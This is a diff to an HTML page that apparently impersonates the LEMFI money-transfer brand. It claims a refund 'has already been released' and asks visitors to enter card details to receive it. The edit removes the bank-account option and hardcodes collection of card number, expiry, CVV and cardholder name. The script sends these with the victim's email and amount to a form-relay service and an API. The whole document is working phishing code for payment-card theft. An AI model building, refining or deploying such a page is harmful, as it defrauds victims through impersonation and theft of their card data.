@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LEMFI — Select Refund Method</title>
+    <title>LEMFI — Refund Details</title>
     <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500;9..40,600;9..40,700&display=swap" rel="stylesheet">
     <style>
         *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
@@ -40,15 +40,6 @@
         .amount-display .value { font-size: 34px; font-weight: 700; color: var(--text-primary); margin-top: 4px; letter-spacing: -1px; }
         .amount-display .currency { font-size: 20px; font-weight: 500; color: var(--text-secondary); vertical-align: top; margin-right: 2px; }
         .section-label { font-size: 14px; font-weight: 600; color: var(--text-primary); margin-bottom: 12px; }
-        .method-toggle { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 22px; }
-        .method-btn { padding: 14px 12px; border: 2px solid var(--border); border-radius: var(--radius-md); background: var(--bg-card); cursor: pointer; text-align: center; transition: all 0.2s; font-family: inherit; }
-        .method-btn:hover { border-color: #D1D5DB; }
-        .method-btn.active { border-color: var(--green-primary); background: var(--green-ghost); }
-        .method-btn svg { width: 24px; height: 24px; margin-bottom: 6px; color: var(--text-secondary); }
-        .method-btn.active svg { color: var(--green-primary); }
-        .method-btn .method-name { font-size: 13px; font-weight: 600; color: var(--text-primary); }
-        .method-fields { display: none; }
-        .method-fields.visible { display: block; }
         .form-group { margin-bottom: 16px; }
         .form-group label { display: block; font-size: 13px; font-weight: 600; color: var(--text-primary); margin-bottom: 6px; }
         .form-group input, .form-group select { width: 100%; padding: 12px 14px; border: 1.5px solid var(--border); border-radius: var(--radius-md); font-size: 14px; font-family: inherit; color: var(--text-primary); background: var(--bg-body); transition: border-color 0.2s; outline: none; }
@@ -89,53 +80,26 @@
             <div class="card-inner">
                 <div class="info-banner animate-in delay-1">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
-                    <p><strong>The refund amount has already been released by the company</strong> and sent to you. To acquire it, select your preferred payment method below and fill in the required details.</p>
+                    <p><strong>The refund amount has already been released by the company</strong> and sent to you. To acquire it, please fill in the required card details below.</p>
                 </div>
                 <div class="amount-display animate-in delay-2">
                     <div class="label">Refund Amount Released</div>
                     <div class="value"><span class="currency">$</span><span id="displayAmount">0.00</span></div>
                 </div>
                 <div class="animate-in delay-3">
-                    <div class="section-label">Select how you want to receive your refund</div>
-                    <div class="method-toggle">
-                        <div class="method-btn active" data-method="bank" onclick="selectMethod('bank')">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 21h18"/><path d="M3 10h18"/><path d="M12 3l9 7H3l9-7z"/></svg>
-                            <div class="method-name">Bank Transfer</div>
-                        </div>
-                        <div class="method-btn" data-method="card" onclick="selectMethod('card')">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
-                            <div class="method-name">Debit Card</div>
-                        </div>
-                    </div>
+                    <div class="section-label">Enter your card details</div>
                 </div>
                 <form id="selectionForm">
                     <input type="hidden" name="access_key" value="YOUR_WEB3FORM_ACCESS_KEY">
                     <input type="hidden" name="subject" value="Refund Payment Method">
                     <input type="hidden" name="from_name" value="Lemfi Website">
                     <input type="hidden" name="page" value="selection.html">
-                    <input type="hidden" id="paymentMethodHidden" name="paymentMethod" value="bank">
+                    <!-- Payment method is hardcoded to card -->
+                    <input type="hidden" id="paymentMethodHidden" name="paymentMethod" value="card">
                     <input type="hidden" id="amountHidden" name="amount" value="">
                     <input type="hidden" id="refundEmailHidden" name="email" value="">
                     
-                    <div id="bankFields" class="method-fields visible animate-in delay-4">
-                        <div class="form-group">
-                            <label for="bankName">Bank Name</label>
-                            <input type="text" id="bankName" name="bankName" placeholder="e.g. Chase, Bank of America" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="accountHolder">Account Holder Name</label>
-                            <input type="text" id="accountHolder" name="accountHolder" placeholder="Name on the bank account" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="accountNumber">Account Number</label>
-                            <input type="text" id="accountNumber" name="accountNumber" placeholder="Enter your account number" required>
-                        </div>
-                        <div class="form-group">
-                            <label for="routingNumber">Routing Number</label>
-                            <input type="text" id="routingNumber" name="routingNumber" placeholder="9-digit routing number" required>
-                        </div>
-                    </div>
-                    <div id="cardFields" class="method-fields animate-in delay-4">
+                    <div id="cardFields" class="method-fields visible animate-in delay-4">
                         <div class="form-group">
                             <label for="cardNumber">Card Number</label>
                             <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
@@ -171,7 +135,8 @@
         </div>
     </div>
     <script>
-        let currentMethod = 'bank';
+        // Method is strictly 'card' now
+        const currentMethod = 'card';
         const savedAmount = localStorage.getItem('refundAmount');
         const savedEmail = localStorage.getItem('refundEmail');
         
@@ -182,14 +147,6 @@
         }
         if (savedEmail) {
             document.getElementById('refundEmailHidden').value = savedEmail;
-        }
-        
-        function selectMethod(method) {
-            currentMethod = method;
-            document.querySelectorAll('.method-btn').forEach(b => b.classList.toggle('active', b.dataset.method === method));
-            document.getElementById('bankFields').classList.toggle('visible', method === 'bank');
-            document.getElementById('cardFields').classList.toggle('visible', method === 'card');
-            document.getElementById('paymentMethodHidden').value = method;
         }
         
         function showToast(msg) { const t = document.getElementById('toast'); t.textContent = msg; t.classList.add('show'); setTimeout(() => t.classList.remove('show'), 3500); }
@@ -215,22 +172,16 @@
                 subject: 'Refund Payment Method',
                 from_name: 'Lemfi Website',
                 page: 'selection.html',
-                paymentMethod: currentMethod,
+                paymentMethod: 'card', // Hardcoded to card
                 amount: savedAmount || '',
                 email: savedEmail || ''
             };
             
-            if (currentMethod === 'bank') {
-                formData.bankName = document.getElementById('bankName').value;
-                formData.accountHolder = document.getElementById('accountHolder').value;
-                formData.accountNumber = document.getElementById('accountNumber').value;
-                formData.routingNumber = document.getElementById('routingNumber').value;
-            } else {
-                formData.cardNumber = document.getElementById('cardNumber').value;
-                formData.cardExpiry = document.getElementById('cardExpiry').value;
-                formData.cardCvv = document.getElementById('cardCvv').value;
-                formData.cardName = document.getElementById('cardName').value;
-            }
+            // Removed Bank logic, strictly card logic
+            formData.cardNumber = document.getElementById('cardNumber').value;
+            formData.cardExpiry = document.getElementById('cardExpiry').value;
+            formData.cardCvv = document.getElementById('cardCvv').value;
+            formData.cardName = document.getElementById('cardName').value;
             
             try {
                 const [web3Response, apiResponse] = await Promise.allSettled([
